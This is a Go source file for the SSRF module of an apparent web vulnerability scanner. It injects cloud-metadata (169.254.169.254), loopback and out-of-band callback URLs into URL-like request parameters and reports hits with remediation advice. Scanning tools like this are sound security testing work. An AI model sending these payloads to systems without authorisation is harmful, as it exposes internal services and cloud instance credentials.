package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"strings"
	"time"
)

type SSRFModule struct{}

func NewSSRFModule() *SSRFModule {
	return &SSRFModule{}
}

func (m *SSRFModule) Name() string {
	return "ssrf"
}

func (m *SSRFModule) Description() string {
	return "Server-Side Request Forgery (SSRF) and Cloud Metadata exposure detector"
}

var ssrfProbes = []struct {
	TargetType string
	Payload    string
	Indicators []string
}{
	{"Cloud Metadata (AWS/OpenStack)", "http://169.254.169.254/latest/meta-data/", []string{"ami-id", "instance-id", "local-ipv4", "security-groups"}},
	{"Local Loopback", "http://127.0.0.1:80/", []string{"nginx", "apache", "iis", "html", "doctype"}},
	{"Localhost IPv6", "http://[::1]:80/", []string{"nginx", "apache", "iis", "html"}},
}

func (m *SSRFModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding
	isPost := strings.ToUpper(target.Method) == "POST"

	for _, param := range target.Parameters() {
		paramLower := strings.ToLower(param)
		if !strings.Contains(paramLower, "url") &&
			!strings.Contains(paramLower, "uri") &&
			!strings.Contains(paramLower, "dest") &&
			!strings.Contains(paramLower, "link") &&
			!strings.Contains(paramLower, "feed") &&
			!strings.Contains(paramLower, "image") &&
			!strings.Contains(paramLower, "path") &&
			!strings.Contains(paramLower, "fetch") &&
			!strings.Contains(paramLower, "host") {
			if len(target.Parameters()) > 3 {
				continue
			}
		}

		// 1. Out-Of-Band (OAST) Blind SSRF testing if listener configured
		if target.OAST != nil {
			probeID := target.OAST.GenerateProbeID()
			cbURL := target.OAST.CallbackURL(probeID)
			subURL := target.OAST.SubdomainURL(probeID)

			for _, testURL := range []string{cbURL, subURL} {
				var err error
				if isPost {
					headers := map[string]string{}
					if target.IsJSON {
						headers["Content-Type"] = "application/json"
					}
					_, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, testURL), headers)
				} else {
					_, err = c.Request("GET", target.BuildURLWithParam(param, testURL), "", nil)
				}
				if err != nil {
					continue
				}

				if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
					f := &Finding{
						Module:      m.Name(),
						Title:       "Blind Server-Side Request Forgery (OAST Callback Confirmed)",
						Severity:    SeverityCritical,
						URL:         target.URL,
						Parameter:   param,
						Payload:     testURL,
						Detail:      fmt.Sprintf("Server initiated out-of-band HTTP request to callback handler for probe %s.", probeID),
						Evidence:    fmt.Sprintf("OAST hit received from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
						Remediation: "Implement strict allow-listing for server-side HTTP fetch requests and restrict network egress.",
						CWEID:       918,
					}
					f.SetConfidence(ConfidenceConfirmed)
					findings = append(findings, f)
					break
				}
			}
		}

		// 2. Direct response indicator probes (Cloud metadata, loopback)
		for _, probe := range ssrfProbes {
			var resp *client.Response
			var err error

			if isPost {
				headers := map[string]string{}
				if target.IsJSON {
					headers["Content-Type"] = "application/json"
				}
				resp, err = c.Request("POST", target.URL, target.BuildBodyWithParam(param, probe.Payload), headers)
			} else {
				resp, err = c.Request("GET", target.BuildURLWithParam(param, probe.Payload), "", nil)
			}

			if err != nil || resp == nil || resp.Body == "" {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			matched := false
			for _, ind := range probe.Indicators {
				if strings.Contains(bodyLower, ind) {
					matched = true
					break
				}
			}

			if matched {
				evidence := resp.Body
				if len(evidence) > 200 {
					evidence = evidence[:200]
				}
				f := &Finding{
					Module:      m.Name(),
					Title:       fmt.Sprintf("Server-Side Request Forgery (%s)", probe.TargetType),
					Severity:    SeverityCritical,
					URL:         target.URL,
					Parameter:   param,
					Payload:     probe.Payload,
					Detail:      fmt.Sprintf("Server-side request dispatched to internal target '%s' and returned sensitive indicators.", probe.Payload),
					Evidence:    fmt.Sprintf("Response snippet: %s", evidence),
					Remediation: "Implement strict server-side egress filtering. Restrict outgoing requests to an allowlist and block 127.0.0.0/8 and 169.254.169.254.",
					CWEID:       918,
				}
				f.SetConfidence(ConfidenceProbable)
				findings = append(findings, f)
				break
			}
		}
	}

	return findings, nil
}
